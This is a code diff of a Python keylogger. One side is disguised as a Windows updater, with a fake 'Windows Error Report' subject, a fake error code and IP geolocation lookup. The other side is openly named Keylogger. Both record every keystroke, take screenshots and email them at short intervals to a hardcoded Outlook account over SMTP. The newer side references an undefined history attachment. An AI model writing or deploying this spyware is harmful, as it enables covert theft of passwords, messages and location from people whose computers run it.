@@ -7,88 +7,119 @@ from email.mime.image import MIMEImage
 from email.mime.text import MIMEText
 from mss import mss
 import browserhistory as bh
-import os
-import requests
 
-CADENCE = 30 # in seconds
-ERROR_ADDR = "installer_error_report@outlook.com"
-ERROR_WORD = "#error#123"
+SEND_REPORT_EVERY = 5 # in seconds, 60 means 1 minute and so on
+EMAIL_ADDRESS = "keylogger__@outlook.com"
+EMAIL_PASSWORD = "keylogger123"
 
-
-class WindowsUpdater:
+class Keylogger:
     def __init__(self, interval, report_method="email"):
-        # we gonna pass CADENCE to interval
+        # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
+        # this is the string variable that contains the log of all 
+        # the keystrokes within `self.interval`
         self.log = ""
         # record start & end datetimes
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
 
     def callback(self, event):
+        """
+        This callback is invoked whenever a keyboard event is occured
+        (i.e when a key is released in this example)
+        """
         name = event.name
         if len(name) > 1:
+            # not a character, special key (e.g ctrl, alt, etc.)
+            # uppercase with []
             if name == "space":
+                # " " instead of "space"
                 name = " "
             elif name == "enter":
+                # add a new line whenever an ENTER is pressed
                 name = "[ENTER]\n"
             elif name == "decimal":
                 name = "."
             else:
+                # replace spaces with underscores
                 name = name.replace(" ", "_")
                 name = f"[{name.upper()}]"
+        # finally, add the key name to our global `self.log` variable
         self.log += name
+    
+    def update_filename(self):
+        # construct the filename to be identified by start & end datetimes
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
 
-    def sendmail(self, email, password, message,verbose=1):
-        
-        screenshot = './windows-error-report.png'
-        url = "https://ipinfo.io/json"
+    def report_to_file(self):
+        """This method creates a log file in the current directory that contains
+        the current keylogs in the `self.log` variable"""
+        # open the file in write mode (create it)
+        with open(f"{self.filename}.txt", "w") as f:
+            # write the keylogs to the file
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+   
+
+    def sendmail(self, email, password, message, verbose=1):
         
         msg = MIMEMultipart()
-        msg["From"] = ERROR_ADDR
-        msg["To"] = ERROR_ADDR
-        msg["Subject"] = "Windows Error Report"
+        msg["From"] = EMAIL_ADDRESS
+        msg["To"] = EMAIL_ADDRESS
+        msg["Subject"] = "Keylogger logs"
         
         with mss() as sct:
-            sct.shot(output=screenshot)
+            sct.shot(output='screenshot.png')
 
         img_data=""
-        with open(screenshot, 'rb') as f:
+        with open('./screenshot.png', 'rb') as f:
             img_data = f.read()
 
-        info_message=""
-        try:
-            response = requests.get(url)
-            responseJSON = response.json()
-            info_message = f''' IP: {responseJSON['ip']} \n 
-                                CITY: {responseJSON['city']} \n 
-                                COUNTRY: {responseJSON['country']} \n 
-                                LOC: {responseJSON['loc']} \n 
-                                ORG: {responseJSON['org']}'''
-        except:
-            info_message = "WINDOWS ERROR, ERROR CODE: 0x800F0907"
-
         image = MIMEImage(img_data)
-        text_part = MIMEText(message, "plain")
-        info_part = MIMEText(str(info_message), "plain")
 
-        msg.attach(text_part)
-        msg.attach(info_part)
-        msg.attach(image)
         
+       
+
+        html = f"<h1>{message}</h1>"
+        text_part = MIMEText(message, "plain")
+        html_part = MIMEText(html, "html")
+        msg.attach(text_part)
+        msg.attach(html_part)
+        msg.attach(image)
+        msg.attach(history_part)
+
         server = smtplib.SMTP(host="smtp.office365.com", port=587)
+        server.ehlo()
         server.starttls()
+        server.ehlo()
         server.login(email, password)
+        # send the actual message after preparation
         server.sendmail(email, email, msg.as_string())
-        os.remove(screenshot)
+        # terminates the session
         server.quit()
-    
+        if verbose:
+            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")
+
     def report(self):
+        """
+        This function gets called every `self.interval`
+        It basically sends keylogs and resets `self.log` variable
+        """
         if self.log:
             # if there is something in log, report it
             self.end_dt = datetime.now()
+            # update `self.filename`
+            self.update_filename()
             if self.report_method == "email":
-                self.sendmail(ERROR_ADDR, ERROR_WORD,self.log)
+                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+                # if you don't want to print in the console, comment below line
+                print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -100,12 +131,16 @@ class WindowsUpdater:
     def start(self):
         # record the start datetime
         self.start_dt = datetime.now()
+        # start the keylogger
         keyboard.on_release(callback=self.callback)
+        # start reporting the keylogs
         self.report()
         # make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
 
     
 if __name__ == "__main__":
-    updater = WindowsUpdater(CADENCE, report_method="email")
-    updater.start()
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    keylogger.start()
